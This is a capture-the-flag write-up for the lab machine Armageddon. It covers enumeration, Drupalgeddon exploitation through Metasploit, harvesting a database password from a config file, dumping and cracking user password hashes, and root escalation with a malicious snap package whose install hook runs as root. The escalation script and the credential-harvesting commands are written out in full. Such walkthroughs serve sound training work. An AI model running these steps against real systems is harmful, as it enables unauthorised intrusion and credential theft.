# My solution

Start with usual nmap enumeration 
```sh
>> nmap -sV -sC -oN nmap-initial 10.10.10.233

PORT   STATE SERVICE VERSION
22/tcp open  ssh     OpenSSH 7.4 (protocol 2.0)
| ssh-hostkey: 
|   2048 82:c6:bb:c7:02:6a:93:bb:7c:cb:dd:9c:30:93:79:34 (RSA)
|   256 3a:ca:95:30:f3:12:d7:ca:45:05:bc:c7:f1:16:bb:fc (ECDSA)
|_  256 7a:d4:b3:68:79:cf:62:8a:7d:5a:61:e7:06:0f:5f:33 (ED25519)
80/tcp open  http    Apache httpd 2.4.6 ((CentOS) PHP/5.4.16)
|_http-generator: Drupal 7 (http://drupal.org)
| http-robots.txt: 36 disallowed entries (15 shown)
| /includes/ /misc/ /modules/ /profiles/ /scripts/ 
| /themes/ /CHANGELOG.txt /cron.php /INSTALL.mysql.txt 
| /INSTALL.pgsql.txt /INSTALL.sqlite.txt /install.php /INSTALL.txt 
|_/LICENSE.txt /MAINTAINERS.txt
|_http-server-header: Apache/2.4.6 (CentOS) PHP/5.4.16
|_http-title: Welcome to  Armageddon |  Armageddon

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 9.74 seconds
```

## Foothold

It is possible to notice some exposed resources from the output of nmap.   
The file *CHANGELOG.txt* reports that the Drupal version in use is the 7.56, whose last update was in 2017.  
It tells us that the service has not been updated for a while. Thus we look for vulnerabilities in Drupal.

```sh
>> searchsploit drupal 7.56                                                                                                                                                                          
-------------------------------------------------------------------------------- ---------------------------------                                                                                                                         
 Exploit Title                                                                  |  Path                                                                                                                                                    
-------------------------------------------------------------------------------- ---------------------------------                                                                                                                         
Drupal < 7.58 - 'Drupalgeddon3' (Authenticated) Remote Code (Metasploit)        | php/webapps/44557.rb                                                                                                                                     
Drupal < 7.58 - 'Drupalgeddon3' (Authenticated) Remote Code Execution (PoC)     | php/webapps/44542.txt                                                                                                                                    
Drupal < 7.58 / < 8.3.9 / < 8.4.6 / < 8.5.1 - 'Drupalgeddon2' Remote Code Execu | php/webapps/44449.rb                                                                                                                                     
Drupal < 8.3.9 / < 8.4.6 / < 8.5.1 - 'Drupalgeddon2' Remote Code Execution (Met | php/remote/44482.rb                                                                                                                                      
Drupal < 8.3.9 / < 8.4.6 / < 8.5.1 - 'Drupalgeddon2' Remote Code Execution (PoC | php/webapps/44448.py               
Drupal < 8.5.11 / < 8.6.10 - RESTful Web Services unserialize() Remote Command  | php/remote/46510.rb                
Drupal < 8.6.10 / < 8.5.11 - REST Module Remote Code Execution                  | php/webapps/46452.txt              
Drupal < 8.6.9 - REST Module Remote Code Execution                              | php/webapps/46459.py               
-------------------------------------------------------------------------------- ---------------------------------   
```

We are looking for remote code execution. *Drupalgeddon3* seems to be what we really need. 


#### Using metasploit
The exploit is also available as a metasploit module: `unix/webapp/drupal_drupalgeddon2 `   
We set the options and run the exploit. We get a meterpreter shell as the **apache** user

The exploit can be easily performed without metasploit. Try it if you want more insights on the vulnerability and how the exploit works.  
Alternatively, you can set the proxy option in the meterpreter module, pointing to your proxy (e.g. Burp). You can then study the traffic to analyze what the exploit is doing.

## User

By printing the /etc/passwd file we find out that the machine has a user named brucetherealadmin.
```sh
brucetherealadmin:x:1000:1000::/home/brucetherealadmin:/bin/bash
```


The file *.gitignore* lists some interesting files that is worth looking at.  
One of them is the *sites/* directory.

We analyze the content of this directory and after some minutes of manual search, we found in *sites/all/settings* the password of *drupaluser* for the *mysql* database.
```
$databases = array (                                                                                 
  'default' =>                                                                                       
  array (                                                                                            
    'default' =>                                                                                     
    array (                                                                                          
      'database' => 'drupal',                                                                        
      'username' => 'drupaluser',                                                                    
      'password' => 'CQHEy@9M*m23gBVj',                                                              
      'host' => 'localhost',                                                                         
      'port' => '',                                                                                  
      'driver' => 'mysql',                                                                           
      'prefix' => '',                                                                                
    ),                                                                                               
  ),                                                                                                 
);    
```

We first try the password with *brucetherealadmin* in ssh but does not work. 

As expected, the credentials are valid for the myswl database.

I couldn't access the database interactively because the shell froze after each attempt. So I wrote an inline mysql command to get the names of the tables:
```sh
mysql -u drupaluser -p drupal -e "show tables;"
```
The database has a bunch of tables. We proceed by dumping the *Users* table and getting the password hash of *brucetherealadmin*.
```
bash-4.2$ mysql -u drupaluser -p drupal -e "select name,pass,mail from users;"
Enter password: 
name    pass    mail

brucetherealadmin       $S$DgL2gjv6ZtxBo6CdqZEyJuBphBmrCqIV6W97.oOsUf1xAhaadURt admin@armageddon.eu
kera    $S$D4fb5rvwm0575Wnd4tgE.vhQ7xMjPiK0g/yC5xbH2EXQe7lKx22R kera@local.host
xsombi  $S$DdWvgfvc2Sv4BChUQLYUpvbvL5poB/6y0A0j.7OrlPnGRDEoaUCx xsombi@mail.com
blafucker       $S$DtI2o1d6OJzZn6cn4TlFBuGpCskt6VYkbE21YiemNVCtNoJGiM3Y bla@bla.com
```

The hash is in Drupal7 format, which is not available in hashcat but it's supported by John the Ripper.

```sh
john --format=Drupal7 --wordlist /usr/share/wordlists/rockyou.txt hash
```
In less then a second we get the cracked password: `booboo`

We can now login to brucetherealadmin in ssh and get the flag.


## Root
We enumerate which commands the user *brucetherealadmin* can execute as sudo.
As we see from the output of `sudo -l`, the user can execute `sudo snap install *` without being asked for a password. The **\*** means that any argument can be passed. 

Such behavior looks quite odd. We look in *GTFObins* to see if it can be exploitable.  
Turns out that we can build our own malicious snap package and install it in the victim machine, triggering code execution under the *root* user. 

We slightly modify the GTFO script to print the root flag ( a reverse shell could have been injected too), and we run it in the host machine. The malicious snap package will be created.
```sh
COMMAND='cat /root/root.txt'
init_dir=$(pwd)
temp=$(mktemp -d)
cd $temp
mkdir -p meta/hooks
printf '#!/bin/sh\n%s; false' "$COMMAND" >meta/hooks/install
chmod +x meta/hooks/install
fpm -n namesnap -s dir -t snap -a all meta
cp  $temp/namesnap* $init_dir
```

We transfer the package just created to the victim machine and we install it.  
Install the snap package:
```sh
[brucetherealadmin@armageddon tmp]$ sudo snap install /tmp/out.snap --dangerous --devmode                                                                                                              
error: cannot perform the following tasks:
- Run install hook of "namesnap" snap if present (run hook "install": 44ea752ae10856a7f3200e0e7718d898)
```

The --dangerous flag is required because the snap is not signed by the Snap Store. The --devmode flag acknowledges that you are installing an unconfined application.

The root flag is displayed.
